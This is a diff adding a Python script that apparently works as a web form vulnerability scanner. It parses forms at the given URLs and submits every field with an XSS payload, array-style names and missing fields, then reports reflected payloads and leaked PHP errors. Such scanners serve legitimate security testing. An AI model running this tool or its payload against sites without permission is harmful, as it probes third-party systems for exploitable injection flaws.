@@ -1,0 +1,127 @@
+#!/usr/bin/python3
+
+import argparse
+import json
+import urllib.parse
+import urllib3
+import bs4
+
+payload1 = "<img src=x onerror=alert(1)>'''''"
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument("urls", nargs='+', help="urls to scan")
+parser.add_argument("-d", "--debug", action="store_true",
+                    help="Show detailed debugging info")
+parser.add_argument("-c", "--cookie", nargs=1,
+                    help="Cookie of the form x=y")
+args = parser.parse_args()
+
+pool = urllib3.PoolManager(10)
+
+headers = {}
+print(args.cookie)
+if args.cookie:
+    headers = {'Cookie': args.cookie[0]}
+
+simplechecks = {
+    '<b>Notice</b>:': "PHP Notice",
+    '<b>Warning</b>:': "PHP Warning",
+    '<b>Fatal error</b>:': "PHP Fatal error"
+}
+
+
+def DEBUG(msg):
+    if args.debug:
+        print("DEBUG: %s" % msg)
+
+
+def run(turl, attackvars, method):
+    if args.debug:
+        print("Trying with")
+        print(attackvars)
+    r = pool.request(method, turl, fields=attackvars,
+                     headers=headers)
+    i = 0
+    data = r.data.decode()
+    print(data)
+    if payload1 in data:
+        print("HIT: XSS on %s with %s:" % (turl, method))
+        print(json.dumps(attackvars))
+        i += 1
+    for k, v in simplechecks.items():
+        if k in data:
+            print("HIT: %s on %s with %s:" % (v, turl, method))
+            print(json.dumps(attackvars))
+
+            DEBUG("Simplifying...")
+            av = attackvars.copy()
+            for k in attackvars:
+                av_temp = av.copy()
+                del av_temp[k]
+                r = pool.request(method, turl, fields=av_temp,
+                                 headers=headers)
+                if k in r.data.decode():
+                    # we can remove k
+                    av = av_temp
+            if av == attackvars:
+                print("Could not simplify")
+            else:
+                print("Simpler attack:")
+                print(json.dumps(av))
+            print()
+            i += 1
+
+    return i
+
+
+def attack(turl, inputs, method):
+    i = 0
+    attack1 = {}
+    DEBUG("Trying all fields with XSS payload")
+    for k in inputs:
+        attack1 = inputs.copy()
+        attack1[k] = payload1
+        i += run(turl, attack1, method)
+    DEBUG("Trying all fields with array")
+    for k in inputs:
+        attack2 = inputs.copy()
+        del attack2[k]
+        attack2[k + "[]"] = payload1
+        i += run(turl, attack2, method)
+    DEBUG("Trying with missing fields")
+    for k in inputs:
+        attack2 = inputs.copy()
+        del attack2[k]
+        i += run(turl, attack2, method)
+    return i
+
+
+i = 0
+for url in args.urls:
+    if args.debug:
+        print("Scanning %s" % url)
+    r = pool.request('GET', url,
+                     headers=headers)
+
+    bs = bs4.BeautifulSoup(r.data, 'html.parser')
+    for form in bs.find_all("form"):
+        action = ""
+        if form.has_attr('action'):
+            action = form['action']
+        target = urllib.parse.urljoin(url, action)
+        if args.debug:
+            print("Attacking form with target %s" % target)
+        inputs = {}
+        for var in form.find_all("input"):
+            if var.has_attr('name'):
+                k = var['name']
+                v = ""
+                if var.has_attr('value'):
+                    v = var['value']
+                inputs[k] = v
+
+        i += attack(target, inputs, 'POST')
+        i += attack(target, inputs, 'GET')
+
+print("%i Hits" % i)
